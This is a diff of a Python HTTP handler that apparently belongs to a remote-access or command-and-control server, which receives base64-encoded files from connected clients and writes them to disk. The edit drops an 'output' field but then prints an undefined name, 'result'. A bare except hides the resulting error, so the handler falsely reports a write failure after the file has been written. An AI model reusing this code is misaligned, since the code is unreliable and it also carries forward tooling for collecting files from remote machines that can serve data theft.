@@ -35,12 +35,12 @@ class myHandler(BaseHTTPRequestHandler):
 
         if client_id == globals.CURRENT_CLIENT:
             if (self.isDownloadFunctCalled(json_response)):
-                filename, content, output = self.parseDownload(json_response)
+                filename, content = self.parseDownload(json_response)
                 try:
                     with open(filename, mode='wb') as file: # b is importante -> binary
                         content = base64.b64decode(content)
                         file.write(content)
-                        print(Color.F_Green + output + Color.reset)
+                        print(Color.F_Green + result + Color.reset)
                 except:
                     print (Color.F_Red + "\r\n[!] Error: Writing file!" + Color.reset)
             else:
@@ -104,17 +104,15 @@ class myHandler(BaseHTTPRequestHandler):
 
     def parseDownload(self, json_result):
         downloaded_file_path = ""
-        output = ""
         file_content = ""
 
         try:
-            output = json_result["result"]
             downloaded_file_path = json_result["pathDst"]
             file_content = json_result["file"]
         except KeyError:
             pass
 
-        return downloaded_file_path, file_content, output
+        return downloaded_file_path, file_content
 
     def getPwd(self, json_response):
         try:
